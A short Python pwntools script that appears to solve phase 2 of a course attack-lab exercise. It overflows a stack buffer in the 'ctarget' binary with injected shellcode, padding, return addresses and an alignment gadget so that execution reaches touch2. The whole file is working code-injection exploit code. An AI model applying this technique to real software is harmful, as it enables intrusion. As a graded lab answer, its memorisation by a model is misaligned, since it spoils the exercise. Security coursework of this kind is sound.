#!/usr/bin/env python3

from pwn import *
from sys import argv

proc = process(["ctarget", *argv])
elf = ELF("ctarget")
cookie = int(open("cookie.txt").read(), 16)
buffer_addr = 0x55617488
buffer_size = 0x18

shellcode = asm(f"mov edi, {cookie}; ret")
# Sneaky RET ROPgadget to satisfy 128-bit alignment for movaps in sprintf
exploit = shellcode + b"\x90" * (buffer_size - len(shellcode)) \
    + p64(buffer_addr) \
    + p64(buffer_addr + len(shellcode) - 1) \
    + p64(elf.symbols["touch2"])
open("c2.in", "wb").write(exploit)

proc.sendline(exploit)
proc.interactive()
